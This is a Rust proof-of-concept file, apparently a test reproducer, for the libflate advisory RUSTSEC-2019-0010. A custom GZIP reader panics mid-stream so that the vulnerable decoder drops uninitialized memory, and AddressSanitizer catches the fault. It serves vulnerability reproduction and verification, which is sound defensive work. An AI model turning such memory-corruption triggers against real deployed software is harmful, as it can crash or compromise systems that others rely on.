//! RUSTSEC-2019-0010 / libflate 0.1.24.
//!
//! Mechanical reader/Drop adapter for the panic path described by the
//! advisory and fixed in upstream PR 37. The byte string is the first valid
//! GZIP member from libflate's own MultiDecoder documentation. The next-header
//! read panics after the member ends. Vulnerable libflate installs an
//! uninitialized reader before that call, then invokes its Drop while
//! unwinding. MaybeUninit fields keep creation of the outer adapter valid so
//! AddressSanitizer observes the invalid heap-owning Drop itself.

use libflate::gzip::MultiDecoder;
use std::io::{self, Read};
use std::mem::MaybeUninit;

const MEMBER: &[u8] = &[
    31, 139, 8, 0, 51, 206, 75, 90, 0, 3, 5, 128, 49, 9, 0, 0, 0, 194, 170, 24, 199, 34, 126, 3,
    251, 127, 163, 131, 71, 192, 252, 45, 234, 6, 0, 0, 0,
];

struct PanicAtNextHeader {
    bytes: MaybeUninit<&'static [u8]>,
    position: MaybeUninit<usize>,
    owner: MaybeUninit<Box<u64>>,
}

impl PanicAtNextHeader {
    fn new() -> Self {
        Self {
            bytes: MaybeUninit::new(MEMBER),
            position: MaybeUninit::new(0),
            owner: MaybeUninit::new(Box::new(0x49)),
        }
    }
}

impl Read for PanicAtNextHeader {
    fn read(&mut self, output: &mut [u8]) -> io::Result<usize> {
        // SAFETY: the normal reader is constructed by `new`. Vulnerable
        // libflate never calls Read on the fabricated uninitialized value.
        let bytes = unsafe { self.bytes.assume_init_ref() };
        let position = unsafe { self.position.assume_init_mut() };
        if *position == bytes.len() {
            panic!("published caller-supplied Read panic");
        }
        let count = output.len().min(bytes.len() - *position);
        output[..count].copy_from_slice(&bytes[*position..*position + count]);
        *position += count;
        Ok(count)
    }
}

impl Drop for PanicAtNextHeader {
    fn drop(&mut self) {
        // SAFETY: this is sound for the initialized reader created by `new`.
        // Calling this Drop for fabricated uninitialized storage is precisely
        // the advisory's unsafe behavior and the sanitizer oracle.
        unsafe {
            self.owner.assume_init_drop();
        }
    }
}

fn main() {
    let mut decoder = MultiDecoder::new(PanicAtNextHeader::new()).expect("valid first GZIP member");
    let mut output = [0_u8; 32];
    loop {
        let _ = decoder.read(&mut output);
    }
}
